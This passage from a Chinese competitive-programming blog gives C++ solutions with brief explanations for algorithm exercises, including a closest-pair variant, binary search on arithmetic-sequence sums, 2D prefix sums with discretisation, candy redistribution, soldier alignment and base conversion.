class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">200010</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">double</span> INF = <span class="hljs-number">1e10</span>;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Point</span><br>&#123;<br><span class="hljs-type">double</span> x, y;<br><span class="hljs-type">bool</span> type;<br><span class="hljs-type">bool</span> <span class="hljs-keyword">operator</span>&lt; (<span class="hljs-type">const</span> Point &amp;W) <span class="hljs-type">const</span><br>&#123;<br><span class="hljs-keyword">return</span> x &lt; W.x;<br>&#125;<br>&#125;points[N],temp[N];<br><br><span class="hljs-function"><span class="hljs-type">double</span> <span class="hljs-title">distance</span><span class="hljs-params">(Point a, Point b)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (a.type == b.type) <span class="hljs-keyword">return</span> INF;  <span class="hljs-comment">//最近点对变形</span><br><span class="hljs-type">double</span> dx = a.x - b.x;<br><span class="hljs-type">double</span> dy = a.y - b.y;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">sqrt</span>(dx * dx + dy * dy);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">double</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (l &gt;= r) <span class="hljs-keyword">return</span> INF;   <span class="hljs-comment">//只有一个点</span><br><span class="hljs-type">int</span> mid = l + r &gt;&gt; <span class="hljs-number">1</span>;<br><span class="hljs-type">double</span> mid_x = points[mid].x;<br><span class="hljs-type">double</span> ans = <span class="hljs-built_in">min</span>(<span class="hljs-built_in">dfs</span>(l, mid), <span class="hljs-built_in">dfs</span>(mid + <span class="hljs-number">1</span>, r));<br><span class="hljs-comment">//按y排序(从小到大，只需讨论最近的6个点)</span><br>&#123;<br><span class="hljs-type">int</span> k = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> i = l;<br><span class="hljs-type">int</span> j = mid + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= r)<br>&#123;<br><span class="hljs-keyword">if</span> (points[i].y &lt;= points[j].y) temp[k++] = points[i++];<br><span class="hljs-keyword">else</span> temp[k++] = points[j++];<br>&#125;<br><span class="hljs-keyword">while</span> (i &lt;= mid) temp[k++] = points[i++];<br><span class="hljs-keyword">while</span> (j &lt;= r) temp[k++] = points[j++];<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = l, j = <span class="hljs-number">0</span>; j &lt; k; j++) points[i++] = temp[j];<br>&#125;<br><span class="hljs-comment">//处理位于两边的情况</span><br><span class="hljs-type">int</span> k = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = l; i &lt;= r; i++)  <span class="hljs-comment">//在符合条件的区间</span><br>&#123;<br><span class="hljs-keyword">if</span> (points[i].x &gt;= mid_x - ans &amp;&amp; points[i].x &lt;= mid_x + ans)<br>&#123;<br>temp[k++] = points[i];<br>&#125;<br>&#125;<br><span class="hljs-comment">//算这k个点之间的最小距离</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; k; i++)<br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = i - <span class="hljs-number">1</span>; j &gt;= <span class="hljs-number">0</span> &amp;&amp; temp[i].y - temp[j].y &lt; ans; j--)<br>&#123;<br>ans = <span class="hljs-built_in">min</span>(ans, <span class="hljs-built_in">distance</span>(temp[i], temp[j]));<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> ans;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> T, n;<br>cin &gt;&gt; T;<br><span class="hljs-keyword">while</span> (T--)<br>&#123;<br>cin &gt;&gt; n;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>&#123;<br>cin &gt;&gt; points[i].x &gt;&gt; points[i].y;<br>points[i].type = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = n; i &lt; <span class="hljs-number">2</span> * n; i++)<br>&#123;<br>cin &gt;&gt; points[i].x &gt;&gt; points[i].y;<br>points[i].type = <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-built_in">sort</span>(points, points + <span class="hljs-number">2</span> * n);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.3f\n&quot;</span>, <span class="hljs-built_in">dfs</span>(<span class="hljs-number">0</span>, <span class="hljs-number">2</span> * n - <span class="hljs-number">1</span>));<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="防线">防线</h4><ol type="1"><li>二分性质：满足条件的一半防具之和为奇数，另一半防具之和为偶数</li><li>求某个点的前缀和：由于本题数据空间较大，不可能使用前缀和数组来存储，只能用到的时候进行计算（O(n)）；以sum[x]为例，遍历每一个等差数列(s,e,d,)，若s&lt;=x，则该等差数列对sum[x]的贡献为(min(e,x)-s)/2+1</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> LL;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">200010</span>;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">seq</span><br>&#123;<br><span class="hljs-type">int</span> s, e, d;<br>&#125;seqs[N];<br><span class="hljs-type">int</span> n;<br><br><span class="hljs-function">LL <span class="hljs-title">get_sum</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>LL res = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (seqs[i].s &lt;= x)<br>&#123;<br>res += (<span class="hljs-built_in">min</span>(x, seqs[i].e) - seqs[i].s) / seqs[i].d + <span class="hljs-number">1</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> res;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> T;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;T);<br><span class="hljs-keyword">while</span> (T--)<br>&#123;<br><span class="hljs-type">int</span> l = <span class="hljs-number">0</span>, r = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;n);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>&#123;<br><span class="hljs-type">int</span> s, e, d;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d%d&quot;</span>, &amp;s, &amp;e, &amp;d);<br>seqs[i] = &#123; s,e,d &#125;;<br>r = <span class="hljs-built_in">max</span>(r, e);<br>&#125;<br><span class="hljs-keyword">while</span> (l &lt; r)<br>&#123;<br><span class="hljs-type">int</span> mid = (LL)l + r &gt;&gt; <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">get_sum</span>(mid) &amp; <span class="hljs-number">1</span>) r = mid;<br><span class="hljs-keyword">else</span> l = mid + <span class="hljs-number">1</span>;<br>&#125;<br>LL ans = <span class="hljs-built_in">get_sum</span>(l)-<span class="hljs-built_in">get_sum</span>(l<span class="hljs-number">-1</span>);<br><span class="hljs-keyword">if</span> (ans &amp; <span class="hljs-number">1</span>) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %lld\n&quot;</span>, l, ans);<br><span class="hljs-keyword">else</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;There&#x27;s no weakness.\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="赶牛入圈">赶牛入圈</h4><p>二维地图离散化（只记录有草的坐标）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">typedef</span> pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; PII;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1010</span>;<br>PII areas[N];<br><span class="hljs-type">int</span> sum[N][N];<br><span class="hljs-type">int</span> c, n;<br>vector&lt;<span class="hljs-type">int</span>&gt; nums;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> l = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> r = nums.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;<br><span class="hljs-keyword">while</span> (l &lt; r)<br>&#123;<br><span class="hljs-type">int</span> mid = (l + r) &gt;&gt; <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span> (nums[mid] &gt;= x) r = mid;<br><span class="hljs-keyword">else</span> l = mid + <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">return</span> l;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">check</span><span class="hljs-params">(<span class="hljs-type">int</span> len)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> x1 = <span class="hljs-number">1</span>, x2 = <span class="hljs-number">1</span>; x2 &lt; nums.<span class="hljs-built_in">size</span>(); x2++)<br>&#123;<br><span class="hljs-keyword">while</span> (nums[x2] - nums[x1] + <span class="hljs-number">1</span> &gt; len) x1++;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> y1 = <span class="hljs-number">1</span>, y2 = <span class="hljs-number">1</span>; y2 &lt; nums.<span class="hljs-built_in">size</span>(); y2++)<br>&#123;<br><span class="hljs-keyword">while</span> (nums[y2] - nums[y1] + <span class="hljs-number">1</span> &gt; len) y1++;<br><span class="hljs-keyword">if</span> (sum[x2][y2] - sum[x1 - <span class="hljs-number">1</span>][y2] - sum[x2][y1 - <span class="hljs-number">1</span>] + sum[x1 - <span class="hljs-number">1</span>][y1 - <span class="hljs-number">1</span>] &gt;= c) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cin &gt;&gt; c &gt;&gt; n;<br>nums.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">0</span>);  <span class="hljs-comment">//有用坐标从1开始记录</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>&#123;<br><span class="hljs-type">int</span> x, y;<br>cin &gt;&gt; x &gt;&gt; y;<br>areas[i] = <span class="hljs-built_in">make_pair</span>(x, y);<br>nums.<span class="hljs-built_in">push_back</span>(x);<br>nums.<span class="hljs-built_in">push_back</span>(y);<br>&#125;<br><span class="hljs-comment">//离散化</span><br><span class="hljs-built_in">sort</span>(nums.<span class="hljs-built_in">begin</span>(), nums.<span class="hljs-built_in">end</span>());<br>nums.<span class="hljs-built_in">erase</span>(<span class="hljs-built_in">unique</span>(nums.<span class="hljs-built_in">begin</span>(),nums.<span class="hljs-built_in">end</span>()), nums.<span class="hljs-built_in">end</span>());<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>&#123;<br><span class="hljs-type">int</span> x = areas[i].first;<br><span class="hljs-type">int</span> y = areas[i].second;<br>sum[<span class="hljs-built_in">find</span>(x)][<span class="hljs-built_in">find</span>(y)]++;<br>&#125;<br><span class="hljs-comment">//计算前缀和</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; nums.<span class="hljs-built_in">size</span>(); i++)<br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt; nums.<span class="hljs-built_in">size</span>(); j++)<br>&#123;<br>sum[i][j] += sum[i - <span class="hljs-number">1</span>][j] + sum[i][j - <span class="hljs-number">1</span>] - sum[i - <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>];<br>&#125;<br>&#125;<br><span class="hljs-type">int</span> l = <span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> r = <span class="hljs-number">10000</span>;<br><span class="hljs-keyword">while</span> (l &lt; r)<br>&#123;<br><span class="hljs-type">int</span> mid = (l + r) &gt;&gt; <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">check</span>(mid)) r = mid;<br><span class="hljs-keyword">else</span> l = mid + <span class="hljs-number">1</span>;<br>&#125;<br>cout &lt;&lt; l &lt;&lt; endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="糖果传递">糖果传递</h4><p>均分纸牌问题（两遍前缀和）</p><p>参考：https://www.acwing.com/solution/content/41677/</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cmath&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> LL;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1000010</span>;<br><span class="hljs-type">int</span> a[N];<br><span class="hljs-type">int</span> s[N];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> n;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;n);<br>LL sum = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br>cin &gt;&gt; a[i];<br>sum += a[i];<br>&#125;<br><span class="hljs-type">int</span> avg = sum / n;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br>s[i] = s[i - <span class="hljs-number">1</span>] + a[i] - avg;<br>&#125;<br><span class="hljs-built_in">sort</span>(s + <span class="hljs-number">1</span>, s + n + <span class="hljs-number">1</span>);<br>LL ans = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (i != (n / <span class="hljs-number">2</span> + <span class="hljs-number">1</span>))<br>&#123;<br>ans += <span class="hljs-built_in">abs</span>(s[i] - s[n / <span class="hljs-number">2</span> + <span class="hljs-number">1</span>]);<br>&#125;<br>&#125;<br>cout &lt;&lt; ans &lt;&lt; endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="士兵">士兵</h4><p>过程：</p><ol type="1"><li><p>找到一个y，将所有点都拉倒x=y这条直线上的距离最短（货仓选址选y）</p></li><li><p>x1，x2，x3，····，xn(排好序) 按照a，a+1，a+2，a+3，····，a+n-1排序</p><p>距离为：|x1-a|+|x2-1-a|+|x3-2-a|+····+|xn-(n-1)-a|，将xi变换为xi-(i-1)，货仓选址选a</p></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cmath&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">10010</span>;<br><span class="hljs-type">int</span> x[N];<br><span class="hljs-type">int</span> y[N];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> n;<br>cin &gt;&gt; n;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br>cin &gt;&gt; x[i] &gt;&gt; y[i];<br>&#125;<br><span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">sort</span>(y + <span class="hljs-number">1</span>, y + n + <span class="hljs-number">1</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br>ans += <span class="hljs-built_in">abs</span>(y[i] - y[n / <span class="hljs-number">2</span> + <span class="hljs-number">1</span>]);<br>&#125;<br><span class="hljs-built_in">sort</span>(x + <span class="hljs-number">1</span>, x + n + <span class="hljs-number">1</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br>x[i] -= i - <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-built_in">sort</span>(x + <span class="hljs-number">1</span>, x + n + <span class="hljs-number">1</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br>ans += <span class="hljs-built_in">abs</span>(x[i] - x[n / <span class="hljs-number">2</span> + <span class="hljs-number">1</span>]);<br>&#125;<br>cout &lt;&lt; ans &lt;&lt; endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="数的进制转换">数的进制转换</h4><p>一个任意进制的数转换为十进制：乘进制数+当前位（前往后）</p><p>十进制转换为任意进制：短除法（mod进制数求个位，除以进制数继续求个位-&gt;逐步求出每一位）</p><p>把a进制转换为b进制：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> T;<br>cin &gt;&gt; T;<br><span class="hljs-keyword">while</span> (T--)<br>&#123;<br><span class="hljs-type">int</span> a, b;<br>string line;<br>cin &gt;&gt; a &gt;&gt; b &gt;&gt; line;<br>vector&lt;<span class="hljs-type">int</span>&gt; nums;<br>vector&lt;<span class="hljs-type">int</span>&gt; ans;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; line.<span class="hljs-built_in">length</span>(); i++)<br>&#123;<br><span class="hljs-keyword">if</span> (line[i] &lt;= <span class="hljs-string">&#x27;9&#x27;</span>) nums.<span class="hljs-built_in">push_back</span>(line[i] - <span class="hljs-string">&#x27;0&#x27;</span>);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (line[i] &lt;= <span class="hljs-string">&#x27;Z&#x27;</span>) nums.<span class="hljs-built_in">push_back</span>(line[i] - <span class="hljs-string">&#x27;A&#x27;</span> + <span class="hljs-number">10</span>);<br><span class="hljs-keyword">else</span> nums.<span class="hljs-built_in">push_back</span>(line[i] - <span class="hljs-string">&#x27;a&#x27;</span> + <span class="hljs-number">36</span>);<br>&#125;<br><span class="hljs-built_in">reverse</span>(nums.<span class="hljs-built_in">begin</span>(), nums.<span class="hljs-built_in">end</span>());  <span class="hljs-comment">//后置0</span><br><span class="hljs-keyword">while</span> (nums.<span class="hljs-built_in">size</span>())<br>&#123;<br><span class="hljs-type">int</span> t = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = nums.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>&#123;<br>nums[i] += t * a;<br>t = nums[i] % b;<br>nums[i] /= b;<br>&#125;<br>ans.<span class="hljs-built_in">push_back</span>(t);<br><span class="hljs-keyword">while</span> (nums.<span class="hljs-built_in">size</span>() &amp;&amp; nums.<span class="hljs-built_in">back</span>() == <span class="hljs-number">0</span>) nums.<span class="hljs-built_in">pop_back</span>();<br>&#125;<br><span class="hljs-built_in">reverse</span>(ans.<span class="hljs-built_in">begin</span>(), ans.<span class="hljs-built_in">end</span>());<br>string ansline;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> x : ans)   <span class="hljs-comment">//遍历vector的方法</span><br>&#123;<br><span class="hljs-keyword">if</span> (x &lt;= <span class="hljs-number">9</span>) ansline += <span class="hljs-built_in">char</span>(x + <span class="hljs-string">&#x27;0&#x27;</span>);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (x &lt;= <span class="hljs-number">35</span>) ansline += <span class="hljs-built_in">char</span>(x + <span class="hljs-string">&#x27;A&#x27;</span> - <span class="hljs-number">10</span>);<br><span class="hljs-keyword">else</span> ansline += <span class="hljs-built_in">char</span>(x + <span class="hljs-string">&#x27;a&#x27;</span> - <span class="hljs-number">36</span>);<br>&#125;<br>cout &lt;&lt; a &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; line &lt;&lt; endl;<br>cout &lt;&lt; b &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; ansline &lt;&lt; endl;<br>cout &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 